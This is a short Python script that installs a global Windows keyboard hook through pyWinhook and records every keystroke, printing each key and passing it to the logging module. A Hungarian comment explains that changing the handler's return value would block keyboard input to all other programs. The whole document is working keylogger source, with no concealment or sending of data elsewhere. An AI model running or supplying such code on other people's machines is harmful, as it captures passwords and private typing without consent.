import pythoncom, pyWinhook, sys, logging

def OnKeyboardEvent(event):
    print("Key: ", chr(event.Ascii))
    logging.log(10,chr(event.Ascii))
    return True
    # ha false return, akkor nem fogad inputot sehol, csak pythonban --> ctrl + alt + del + egérrel tudok kilépni akkor

hm = pyWinhook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()